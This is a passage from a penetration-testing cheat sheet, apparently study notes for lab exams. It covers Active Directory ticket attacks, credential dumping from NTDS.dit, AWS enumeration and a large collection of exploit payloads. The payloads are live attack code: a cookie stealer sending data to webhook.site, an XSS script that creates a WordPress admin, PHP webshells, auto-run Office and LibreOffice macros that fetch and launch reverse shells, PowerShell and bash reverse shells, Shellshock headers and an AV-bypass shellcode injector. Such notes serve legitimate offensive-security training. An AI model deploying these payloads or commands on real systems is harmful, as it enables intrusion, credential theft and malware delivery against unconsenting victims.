.\\PsExec.exe \\\\files04 cmd OR any cmd\n# winrs will gonna through error on this\nklist\n# if we have rc4, aes128 or aes256  then use /hashname:  in mimikatz\n\n# in kali, OPth\nimpacket-getTGT -hashes :11223344556677889900aabbccddeeff corp.com/Administrator -dc-ip 192.168.238.7 # &gt; Using an incorrect domain format (e.g., `corp/` instead of `corp.com/`) can cause a `STATUS_MORE_PROCESSING_REQUIRED` error when using the TGT with tools like `impacket-psexec`.\nexport KRB5CCNAME=Administrator.ccache  # export the ticket to env\nklist \nimpacket-psexec -k corp.com/Administrator@hostname.corp.com -dc-ip 192.168.238.70 -no-pass # -k for kerberos auth and hostname requires in kerb auth\n# in order to setup your kali to use DC as dns for specific domain check out [[Linux &amp; Windows commands#setting up dnsmasq]]\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#pass-the-ticket","title":"Pass The Ticket","text":"<pre><code># \ud83d\udeb6 Pass the Ticket, requires admin rights to dump tickts from lsass\n# impersonate any user through injecting their tickets (TGS or TGT) into our session from LSASS memory\nmimikatz&gt; privilege::debug\nsekurlsa::tickets /export   # dumps any TGT or TGS from LSASS memory and saves in *.kirbi\n# We can see which user has which TGS by analyzing the naming convention of `.kirbi` files.\n# to inject any high privileged Ticket into our current session\nkerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi  # (TGS used here) we can also use TGT too \nklist # to check tickets in our session\n\n# In Kali\npython3 ticketConverter.py dave@cifs-web04.kirbi dave-web04.ccache # first convert the kirbi to ccache (supported by kali)\nexport KRB5CCNAME=$(pwd)/dave@cifs-web04.ccache   # TGT can be used here, TESTED\nklist\nimpacket-smbclient -k -no-pass corp.com/dave@web04.corp.com -dc-ip 192.168.x.x\n\n# \ud83d\udeb6 thru DCOM, read more about it [[Active Directory Pentesting#DCOM]]\n$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"192.168.50.73\"))\n$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")\n\n\n# ALSO CHECK [[#\ud83d\udeaaInitial Access]]  and  [[Active Directory Pentesting#Different Access Types]]\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#rdp-hijacking","title":"RDP Hijacking","text":"<p>just written for knowledge we can dump hashes of user as an administrator directly from the memory <pre><code># Administrator user needed to be logged in thru' RDP\nquery user\n# if any user has the state: Disc\ntscon 3 /dest:rdp-tcp#6 # dest should be our session name\n</code></pre></p>"},{"location":"10_Commands_Quick_Reference/#persistence","title":"Persistence","text":""},{"location":"10_Commands_Quick_Reference/#golden-ticket","title":"Golden Ticket","text":"<pre><code># \ud83c\udfabGolden Ticket  -  Needs to compromise domain controller to extract krbtgt hash\n# we can forge a TGT using the **krbtgt** hash to gain full control over domain resources.\nmimikatz&gt; privilege::debug\nlsadump::lsa /patch\n# after getting ntlm hash of krbtgt, we can forge tgt in any machine\nkerberos::purge  # delete any kerberos tickets\nkerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt\nmisc::cmd\n# this attack is like overpass the hash attack because getting ticket through hash.\n\n# in kali, ticketer used to created silver/golder ticket\nimpacket-ticketer -nthash &lt;KRBTGT_NTLM&gt; -domain-sid &lt;SID&gt; -domain corp.com -dc-ip ip Administrator # target user to get privs of\n# to get domain SID from kali\nrpcclient -U \"corp.com/user\" dc-ip\nrcp&gt; lookupdomain corp.com\n\nexport KRB5CCNAME=TICKET.ccache \nklist\nimpacket-psexec -k corp.com/Administrator@hostname.corp.com -dc-ip 192.168.238.70 -no-pass \n</code></pre>"},{"location":"10_Commands_Quick_Reference/#shadow-copies","title":"Shadow Copies","text":"<pre><code># \ud83c\udfabShadow Copies, creates the copy of NTDS.dit from DC and take system hive\nvshadow.exe -nw -p  C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak  # The exact path before \\Windows\\... is determined by the vshadow output \u2014 make sure to copy it accurately from the command result.\nreg.exe save hklm\\system c:\\system.bak\n# on kali, extract the credential using these 2 files\nimpacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#more_2","title":"More","text":"<pre><code># Adding new user to /etc/passwd file\nnc -nlvp 80 &gt; passwd.bak  # to receive passwd file from victim\nnc -nv attacking_IP 80 &lt; /etc/passwd # send\n\n\nmkpasswd --method=MD5 --stdin    \nPassword: pass\n$1$Ls0oeXvv$ZwE8B7S1figJUIq2y/cIQ1\n# add inside passwd.bak\ntest:$1$Ls0oeXvv$ZwE8B7S1figJUIq2y/cIQ1:0:0:Test,,,:/root\n# on victim\nwget -O /etc/passwd attacking_IP/passwd.bak\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#meterpreter-be-cautious-to-use-only-one-1-machine","title":"Meterpreter (Be Cautious to Use only one 1 Machine)","text":"<pre><code>msfconsole -x \"use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.175;set LPORT 4444;run;\"\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#important-payloads","title":"Important payloads","text":"<p>https://www.revshells.com/ <pre><code># Some version of nc doesn't have the -e feature\nbusybox nc 192.168.45.175 7755 -e /bin/bash  # mostly work on every place as compared to other places \n</code></pre></p>"},{"location":"10_Commands_Quick_Reference/#aws","title":"\u2601AWS","text":""},{"location":"10_Commands_Quick_Reference/#domain-recon","title":"Domain Recon","text":"<pre><code># Step 1: Identify the authoritative name servers for the domain\nhost -t ns offseclab.io\n</code></pre> <pre><code># Step 2: Identify the organization behind the nameserver domain (could reveal AWS or third-party services)\nwhois &lt;ns-domain&gt; | grep -i \"Registrant Organization\"\n</code></pre> <p>\ud83d\udca1 Note: If the nameserver domain belongs to AWS (e.g., <code>awsdns-xx.org</code>), it typically indicates the use of Route 53 for DNS management. \u26a0\ufe0f However, this does not confirm that the infrastructure (e.g., web servers, APIs) is also hosted on AWS.</p> <pre><code># Step 3: Resolve the public IP of the web service (e.g., www.offseclab.io)\nhost www.offseclab.io\n</code></pre> <pre><code># Step 4: Perform reverse DNS lookup to get the hostname of the resolved IP\nhost 52.70.117.69\n# Expected output:\n# 69.117.70.52.in-addr.arpa domain name pointer ec2-52-70-117-69.compute-1.amazonaws.com.\n</code></pre> <p>\ud83d\udd0d The presence of <code>ec2-*.compute-1.amazonaws.com</code> in the PTR record strongly suggests the server is an EC2 instance hosted in AWS (specifically in the us-east-1 region).</p> <pre><code># Step 5: Confirm ownership of the IP address using whois\nwhois 52.70.117.69 | grep -i \"OrgName\"\n# Output: Amazon Technologies Inc.\n</code></pre> <p>\u2705 This confirms that the resource is hosted on AWS infrastructure.</p>"},{"location":"10_Commands_Quick_Reference/#service-specific","title":"Service Specific","text":""},{"location":"10_Commands_Quick_Reference/#s3-bucket","title":"S3 bucket","text":"<p>This discovery of bucket or objects within the bucket required some creativity and assumptions but shows an example of enumerating cloud resources. The process is also easy to automate by writing a script on our own or searching for an already-built tool like\u00a0cloudbrute\u00a0or\u00a0cloud-enum. <pre><code># http://domain/bucket_name\ncloud_enum -k bucket_name --quickscan --disable-azure --disable-gcp\n\n# examples\ncloud_enum -k offseclab-assets-public --quickscan --disable-azure --disable-gcp\n# Because we are testing a specific naming pattern, we'll benefit from building a custom key file.\nfor key in \"public\" \"private\" \"dev\" \"prod\" \"development\" \"production\"; do echo \"offseclab-assets-$key\"; done | tee /tmp/keyfile.txt\ncloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp\n</code></pre></p>"},{"location":"10_Commands_Quick_Reference/#enumeration-thru-api","title":"Enumeration thru API","text":"<p>Authenticate first <pre><code>aws configure --profile username  # no need to give the real username, it's just local profile name\n# prompts ask for ACCESS_KEY_ID, SECRET_ACCESS_KEY, REGION_NAME, OUTPUT_FORMAT\n# to check if authenticated successfully\naws --profile attacker sts get-caller-identity  # to get username, account_id, Arn \n</code></pre></p> <p>Enumerate the below - Publicly shared\u00a0Amazon Machine Images\u00a0(AMIs) - Publicly shared\u00a0Elastic Block Storage\u00a0(EBS) snapshots - Relational Databases\u00a0(RDS) snapshots <pre><code># if there's only one profile no need to mention with every command\n# Lists AMIs provided by Amazon\naws --profile username ec2 describe-images --owners amazon --executable-users all\n# Lists shared EBS snapshots\naws --profile attacker ec2 describe-snapshots --filters \"Name=description,Values=*offseclab*\"\n# List s3 bucket objects\naws --profile attacker s3 ls bucketname\n</code></pre></p>"},{"location":"10_Commands_Quick_Reference/#identify-the-aws-account-id-from-a-public-s3-bucket","title":"Identify the AWS Account ID from a Public S3 Bucket","text":"<pre><code># use this tool [s3-account-search](https://github.com/WeAreCloudar/s3-account-search)\ns3-account-search arn:aws:iam::&lt;ACCOUNT_ID&gt;:role/s3_read s3://my-bucket \n# identify s3 bucket region by check the value of x-amz-bucket-region header\ncurl -I https://mega-big-tech.s3.amazonaws.com\n\n# [pwnedLabs.io](https://pwnedlabs.io/labs/identify-the-aws-account-id-from-a-public-s3-bucket)\n</code></pre>"},{"location":"10_Commands_Quick_Reference/#to-filter-search","title":"To filter &amp; search","text":"<pre><code>--filters \"Name=filter-name,Values=filter-value1,filter-value2,...\"\n# example\n--filters \"Name=description,Values=*Offseclab*\"\n</code></pre>"},{"location":"11_Code_And_Exploits/","title":"\ud83d\udca5 Code &amp; Exploits CheatSheet","text":""},{"location":"11_Code_And_Exploits/#online-resources","title":"Online Resources:","text":"<ul> <li>PayloadAllTheThings</li> <li>PayloadPlayground</li> <li>revshells</li> </ul>"},{"location":"11_Code_And_Exploits/#web-attack-payloads","title":"\ud83d\udd78Web Attack Payloads","text":""},{"location":"11_Code_And_Exploits/#xss","title":"XSS","text":"<ul> <li> <p>Hakluke weaponized XSS payloads</p> </li> <li> <p>if secure enabled then cookies are sent through encrypted traffic</p> </li> <li>if httponly means javascript can't access cookies</li> <li>if we can't access cookies then we can try to perform any malcious actions on behalf of our victim user like adding new user for us in the wordpress jscompress</li> </ul>"},{"location":"11_Code_And_Exploits/#test-characters","title":"Test Characters","text":"<pre><code>&lt; &gt; ' \" { } ;   // if any symbol comes unfiltered\n</code></pre>"},{"location":"11_Code_And_Exploits/#create-new-admin-on-wordpress","title":"Create New Admin on WordPress","text":"<ul> <li>Reference: Craft XSS Payload to create new admin user in Wordpress</li> </ul> <pre><code>var ajaxRequest = new XMLHttpRequest(),\n    requestURL = \"/wp-admin/user-new.php\",\n    nonceRegex = /ser\" value=\"([^\"]*?)\"/g;\najaxRequest.open(\"GET\", requestURL, !1), ajaxRequest.send();\nvar nonceMatch = nonceRegex.exec(ajaxRequest.responseText),\n    nonce = nonceMatch[1],\n    params = \"action=createuser&amp;_wpnonce_create-user=\" + nonce + \"&amp;user_login=attacker&amp;email=attacker@site.com&amp;pass1=attacker&amp;pass2=attacker&amp;role=administrator\";\n(ajaxRequest = new XMLHttpRequest()).open(\"POST\", requestURL, !0), ajaxRequest.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"), ajaxRequest.send(params);\n</code></pre> <ul> <li>Minify the code first then encode it to charCode decimal to avoid badchar issue</li> <li>cyberchef (toDecimal)</li> <li>Then deliver the below payload</li> </ul> <pre><code>&lt;script&gt;eval(String.fromCharCode(118,97,114,32,97,....))&lt;/script&gt;\n</code></pre>"},{"location":"11_Code_And_Exploits/#xss-through-svg","title":"XSS through SVG","text":"<pre><code>&lt;svg xmlns=\"http://www.w3.org/2000/svg\" width=\"400\" height=\"400\" viewBox=\"0 0 124 124\" fill=\"none\"&gt;\n&lt;rect width=\"124\" height=\"124\" rx=\"24\" fill=\"#000000\"/&gt;\n   &lt;script type=\"text/javascript\"&gt;  \n      alert(0x539);\n   &lt;/script&gt;\n&lt;/svg&gt;\n</code></pre>"},{"location":"11_Code_And_Exploits/#cookie-stealer","title":"Cookie Stealer","text":"<pre><code>&lt;html&gt;\n    &lt;body&gt;\n        &lt;!-- Hello world! --&gt;\n        &lt;script type=\"text/javascript\"&gt;\n            document.location='https://webhook.site/106ea26d-f0b2-4d07-961a-e2129e035a84?c='+encodeURIComponent(btoa(document.cookie));\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"11_Code_And_Exploits/#directory-traversal","title":"Directory Traversal","text":"<pre><code>LINUX\n/etc/psswd\n\nWINDOWS\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\inetpub\\logs\\LogFiles\\W3SVC1\\\nC:\\inetpub\\wwwroot\\web.config\n</code></pre>"},{"location":"11_Code_And_Exploits/#local-file-inclusion","title":"Local File Inclusion","text":"<ul> <li>LFI Linux List</li> <li>Windows List</li> </ul>"},{"location":"11_Code_And_Exploits/#rce-using-lfi-through-log-poisoning","title":"RCE using LFI through Log poisoning","text":"<p>Check the log files and then check which entry can be poisoned through which language(depends on the webserver) <pre><code>/var/log/apache2/access.log\n\nC:\\xampp\\apache\\logs\\access.log\n</code></pre></p>"},{"location":"11_Code_And_Exploits/#php-wrappers","title":"PHP Wrappers","text":"<p>Using\u00a0php://filter, we can also display the contents of executable files such as\u00a0.php, rather than executing them <pre><code>php://filter/resource=admin.php\nphp://filter/convert.base64-encode/resource=admin.php\n</code></pre> we can use the\u00a0data://\u00a0wrapper to achieve code execution. This wrapper is used to embed data elements as plaintext or base64-encoded data in the running web application's code. This offers an alternative method when we cannot poison a local file with PHP code. <pre><code>data://text/plain,&lt;?php%20echo%20system('ls');?&gt;\ndata://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&amp;cmd=ls\n</code></pre> This is a handy technique that may help us bypass basic filters. However, we need to be aware that the\u00a0data://\u00a0wrapper will not work in a default PHP installation. To exploit it, the\u00a0allow_url_include\u00a0setting needs to be enabled.</p>"},{"location":"11_Code_And_Exploits/#file-upload","title":"File Upload","text":"<p>https://www.onsecurity.io/blog/file-upload-checklist/#uploading-a-htaccess-file https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files</p> <p>![[Insecure File Upload Methdology.png]]</p> <ul> <li>Can be leveraged to upload executable files (e.g., PHP).</li> <li>Can be leveraged to upload and replace sensitive files, such as <code>authorized_keys</code>. We first go with root user (as don't have idea of other users)</li> <li>Can be combined with attacks like XXE or XSS by uploading malicious SVG files (e.g., embedding XXE in an avatar upload to read files or execute code).</li> <li>We can try to upload a CV in\u00a0.docx\u00a0format with malicious\u00a0macros\u00a0integrated</li> </ul>"},{"location":"11_Code_And_Exploits/#bypass-filters","title":"Bypass Filters","text":"<p><pre><code>#Case change\n.PhP\n#other types\n\n[ .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .phar and .inc ]\n\n#end with null characters\n.php%00\n\n# [All the file upload extension list](https://jorgectf.gitbook.io/awae-oswe-preparation-resources/by-vulnerability/file-upload-restrictions-bypass/file-extension-filters-bypass) \n</code></pre> - Change mime\u00a0type - Add\u00a0image headers - Add payload in\u00a0exiftool\u00a0comment\u00a0and name file as file.php.png - ExifTool <pre><code>    exiftool -Comment='&lt;?php system($_GET[\"cmd\"]); ?&gt;' cat.php.jpeg\nstrings cat.php.jpeg | grep system\nfile cat.php.jpeg\n\n# try without .php\n# call like the below\ncat.php.jpeg?cmd=whoami\n</code></pre>   `</p>"},{"location":"11_Code_And_Exploits/#upload-configuration-files","title":"Upload Configuration Files","text":"<p>If you are trying to upload files to a :</p> <ul> <li>PHP server, take a look at the\u00a0.htaccess\u00a0trick to execute code.</li> <li>ASP server, take a look at the\u00a0web.config\u00a0trick to execute code.</li> <li>uWSGI server, take a look at the\u00a0uwsgi.ini\u00a0trick to execute code. ``` title:.htaccess AddType application/x-httpd-php .rce <pre><code>Explanation on config files:\n- [web.confg details](https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/)\n- [htaccess](https://www.onsecurity.io/blog/file-upload-checklist/#uploading-a-htaccess-file)\n### Command Injection\n\n```powershell\n# Command to check what's running on windows\n(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell\n\n# command seperators\n; # in powershell and bash\n&amp; # in cmd\n&amp;&amp; # in everywhere but second command runs when first succeed\n</code></pre></li> </ul> <pre><code>$IFS #instead of space\n\n# To verify for command injection possibility\n$?    # means the string is inside \"\" double quotes\n$(whoami)  # to execute commands within echo \"\"\n</code></pre>"},{"location":"11_Code_And_Exploits/#sqli-payloads","title":"SQLI Payloads","text":"<p>MySQL,\u00a0Microsoft SQL Server,\u00a0PostgreSQL, and\u00a0Oracle\u00a0are the most popular database implementations MySQL\u00a0is one of the most deployed database variants, along with\u00a0MariaDB, an open-source fork of MySQL. - PayloadAllTheThings SQLI - Blind SQLI Manual exploitation - PentestMonkey Cheatsheet</p> <p><pre><code>''+!@#$  -- all the special characters    \n\n'offsec' OR 1=1 -- //\n# We are doing that to raise an error in order to get an output of version\n'' or 1=1 in (select @@version) -- //      \n\n-- Union Based\n-- Verifying exact number of columns\n'' ORDER BY 1-- //\n'%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //\n\n-- boolean based\n'admin' AND BINARY SUBSTRING((SELECT password FROM users WHERE username = 'admin'),FUZZ_INDEX,1) = 'FUZZ_CHAR';#---\n\n-- Time Based \n'' AND IF (1=1, sleep(3),'false') -- //\n'admin' AND IF (SUBSTRING(@@version, FUZZ_INDEX, 1) = FUZZ_CHAR, sleep(3),'false');#---\n\n-- MS SQL CODE EXECUTION\nEXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXECUTE xp_cmdshell 'whoami'; EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\n</code></pre> Check for ffuf commands for Blind SQLi [[Commands - Quick Reference Cheatsheet]]</p>"},{"location":"11_Code_And_Exploits/#client-side-payloads","title":"\ud83e\uddd1 Client Side Payloads","text":""},{"location":"11_Code_And_Exploits/#microsoft-vba-macro-shell","title":"Microsoft VBA Macro Shell","text":"<ul> <li>Macro generator employing msfvenom for revshell.exe payload doc OR docm file types can be used.  VBA has a 255 character limit for literal strings but not for variables. <pre><code># to divide our powershell command into smaller chunks for vba literal string\n\nstr = \"powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA...\"\n\nn = 50\n\nfor i in range(0, len(str), n):\n    print(\"Str = Str + \" + '\"' + str[i:i+n] + '\"')\n</code></pre></li> </ul>"},{"location":"11_Code_And_Exploits/#1","title":"1","text":"<p>\u201cDeveloper\u201d &gt; \u201cMacros\u201d &gt; \u201cVisual Basic\u201d <pre><code>Sub test()  \n' test Macro  \nDim objshell As Object  \nSet objshell = CreateObject(\"Wscript.Shell\")  \nobjshell.Run \"powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"\"$command = {while($true){try {$cl = New-Object System.Net.Sockets.TcpClient('192.168.1.198',443);$st = $cl.GetStream();$rd = New-Object IO.StreamReader($st);$wr = New-Object IO.StreamWriter($st);$wr.AutoFlush = $true;while($cl.Connected){$cmd = $rd.ReadLine();if($cmd -eq 'exit'){break;}try{$res = iex $cmd 2&gt;&amp;1 | Out-String;}catch{$res = $_.Exception.Message;} $wr.WriteLine($res);$wr.Flush();}$cl.Close();}catch{Start-Sleep -Seconds 10;}}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command\"\"\"  \nSet objshell = Nothing  \nEnd Sub\n</code></pre> Then add the below in the thisDocument section <pre><code>Sub AutoOpen()  \n    Call test  \nEnd Sub\n</code></pre></p>"},{"location":"11_Code_And_Exploits/#2-reference","title":"2 Reference:","text":"<pre><code>Sub Document_Open()  \n    MyMacro  \nEnd Sub\n</code></pre> <pre><code>Sub AutoOpen()  \n    MyMacro  \nEnd Sub\n\nSub MyMacro()  \n    Dim str As String  \n    str = \"powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/reverseshell.exe', 'reverseshell.exe')\"  \n    Shell str, vbHide  \n    Dim exePath As String  \n    exePath = ActiveDocument.Path + \"\\reverseshell.exe\"  \n    Wait (2)  \n    Shell exePath, vbHideEnd SubSub Wait(n As Long)  \n    Dim t As Date  \n    t = Now  \n    Do  \n        DoEvents  \n    Loop Until Now &gt;= DateAdd(\"s\", n, t)  \nEnd Sub\n</code></pre>"},{"location":"11_Code_And_Exploits/#3","title":"3","text":"<pre><code>Sub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub\n\nSub MyMacro()\n    Dim Str As String\n\n    Str = Str + \"powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU\"\n        Str = Str + \"AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd\"\n        Str = Str + \"AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB\"\n    ...\n        Str = Str + \"QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA\"\n        Str = Str + \"gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA\"\n        Str = Str + \"A== \"\n\n    CreateObject(\"Wscript.Shell\").Run Str\nEnd Sub\n</code></pre>"},{"location":"11_Code_And_Exploits/#libreoffice-macro-shell","title":"LibreOffice Macro shell","text":"<p>Goto Tools -&gt; Macros -&gt; Organize Macros -&gt; Basic then create macro within that odt document <pre><code>Sub Main\n    Shell(\"cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.119.3/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell \")\nEnd Sub\n</code></pre> Then goto customize, Select open document and then Assign our Macro to it.</p>"},{"location":"11_Code_And_Exploits/#microsoft-library-file","title":"Microsoft Library File","text":"<p>Library File Schema Filename: config.Library-ms <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"&gt;\n&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n&lt;version&gt;6&lt;/version&gt;\n&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n&lt;templateInfo&gt;\n&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n&lt;/templateInfo&gt;\n&lt;searchConnectorDescriptionList&gt;\n&lt;searchConnectorDescription&gt;\n&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n&lt;isSupported&gt;false&lt;/isSupported&gt;\n&lt;simpleLocation&gt;\n&lt;url&gt;http://192.168.45.155&lt;/url&gt; &lt;!-- webdav ip --&gt;\n&lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n&lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre></p> <p>Host a malicious windowss shortcut file in that webdav directory that will gonna give us back the reverse shell. <pre><code>wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/\n</code></pre> Shortcut file content <pre><code>powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.158:8888/psh_scripts/powercat.ps1'); powercat -c 192.168.45.158 -p 4444 -e powershell\"\n</code></pre></p>"},{"location":"11_Code_And_Exploits/#vulnerabilities-or-cve","title":"Vulnerabilities OR CVE","text":""},{"location":"11_Code_And_Exploits/#shellshock","title":"Shellshock","text":"CVE ID Description CVE-2014-6271 (RCE) The original Shellshock vulnerability CVE-2014-7169 Incomplete patch for 6271 CVE-2014-7186 Memory corruption when handling deeply nested functions CVE-2014-7187 Off-by-one error in Bash parser (loop construct) CVE-2014-6277 Exploitable parser bug (discovered by Michal Zalewski) CVE-2014-6278 (RCE) Another parser bug (also by Michal Zalewski) <pre><code>User-Agent: () { ignored;};/bin/bash -i &gt;&amp; /dev/10.10.14.6/4444/port 0&gt;&amp;1\n\nUser-Agent: () { :;};/bin/bash -i &gt;&amp; /dev/10.10.14.6/4444/port 0&gt;&amp;1\n</code></pre>"},{"location":"11_Code_And_Exploits/#exploit-online","title":"Exploit Online:","text":"<p>exploitdb 34900 Cisco UCS Manager 2014-6278</p>"},{"location":"11_Code_And_Exploits/#victim-machine-payloads-shells","title":"Victim Machine Payloads &amp; Shells","text":""},{"location":"11_Code_And_Exploits/#shells","title":"Shells","text":"<ul> <li>https://github.com/samratashok/nishang</li> <li>https://www.revshells.com/</li> </ul>"},{"location":"11_Code_And_Exploits/#wp-plugin-shells","title":"WP plugin shells","text":"<ul> <li>WordPress WebShell Plugin ```php title:webshell.php</li> </ul> \";     system($_GET['cmd']);     echo \"\";     exit; }  // zip -r malplugin.zip malplugin  // wp-content/plugins/malplugin/webshell.php to execute ?&gt; <pre><code>#### WP theme editor shell / webshell\n```php\n# inside theme functions.php\nfunction webshell(){\n  echo shell_exec($_GET['cmd']);\n}\nadd_action('wp_head','webshell');\n</code></pre>"},{"location":"11_Code_And_Exploits/#phpmyadmin-webshell","title":"PhpMyAdmin Webshell","text":"<pre><code>SELECT \n\"&lt;?php echo \\'&lt;form action=\\\"\\\" method=\\\"post\\\" enctype=\\\"multipart/form-data\\\" name=\\\"uploader\\\" id=\\\"uploader\\\"&gt;\\';echo \\'&lt;input type=\\\"file\\\" name=\\\"file\\\" size=\\\"50\\\"&gt;&lt;input name=\\\"_upl\\\" type=\\\"submit\\\" id=\\\"_upl\\\" value=\\\"Upload\\\"&gt;&lt;/form&gt;\\'; if( $_POST[\\'_upl\\'] == \\\"Upload\\\" ) { if(@copy($_FILES[\\'file\\'][\\'tmp_name\\'], $_FILES[\\'file\\'][\\'name\\'])) { echo \\'&lt;b&gt;Upload Done.&lt;b&gt;&lt;br&gt;&lt;br&gt;\\'; }else { echo \\'&lt;b&gt;Upload Failed.&lt;/b&gt;&lt;br&gt;&lt;br&gt;\\'; }}?&gt;\"\nINTO OUTFILE 'C:/wamp/www/uploader.php';\n\n-- [Reference](https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f?ref=benheater.com)\n</code></pre>"},{"location":"11_Code_And_Exploits/#php-webrev-shells","title":"Php web/rev shells","text":"<pre><code>&lt;?php\n\nif(isset($_REQUEST['cmd'])){\n        $local_ip='192.168.45.155';\n        $local_port='4455';\n        system('IEX (New-Object System.Net.Webclient).DownloadString(\"http://'.$local_ip.'/psh_scripts/powercat.ps1\");powercat -c '.$local_ip.' -p '.$local_port.' -e powershell ');\n        die;\n}\n\n?&gt;\n\n\n// very simple one\n&lt;?php echo system($_GET[\"cmd\"]); ?&gt;\n\n&lt;?php\n//reverse shell\nexec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.86.99/443 0&gt;&amp;1'\");  \n?&gt;\n</code></pre>"},{"location":"11_Code_And_Exploits/#powershell","title":"Powershell","text":"<p>Useful Powershell Scripts <pre><code>$Text = '$client = New-Object System.Net.Sockets.TCPClient(\"192.168.45.237\",4455);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n\n# Encode the reverse shell\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)\n$EncodedText =[Convert]::ToBase64String($Bytes)\n$EncodedText\n\npowershell -enc &lt;encodedtext&gt;\npowershell -c \"COMMANDS\"\npowershell -nop bypass -w hidden -enc/-c\n\n\n# POWERCAT\n# /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1\n\nIEX (New-Object System.Net.Webclient).DownloadString(\"http://192.168.45.237:8000/powercat.ps1\");powercat -c 192.168.45.237 -p 4444 -e powershell \n\n# from nishang repo\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666\n</code></pre></p>"},{"location":"11_Code_And_Exploits/#av-bypass-in-memory-injection-ps1","title":"AV Bypass In-Memory Injection (PS1)","text":"<p>NOTE: Below powershell script runs in x86 architecture so run <code>C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</code> to open powershell x86 Reference of the payload <pre><code>$code = '\n[DllImport(\"kernel32.dll\")]\npublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n[DllImport(\"kernel32.dll\")]\npublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n[DllImport(\"msvcrt.dll\")]\npublic static extern IntPtr memset(IntPtr dest, uint src, uint count);';\n\n$var1 = \n  Add-Type -memberDefinition $code -Name \"iWin32\" -namespace Win32Functions -passthru;\n\n[Byte[]];\n[Byte[]]$var2 = &lt;place your shellcode here&gt;;\n\n$size = 0x1000;\n\nif ($var2.Length -gt 0x1000) {$size = $var2.Length};\n\n$x = $var1::VirtualAlloc(0,$size,0x3000,0x40);\n\nfor ($i=0;$i -le ($var2.Length-1);$i++) {$var1::memset([IntPtr]($x.ToInt32()+$i), $var2[$i], 1)};\n\n$var1::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 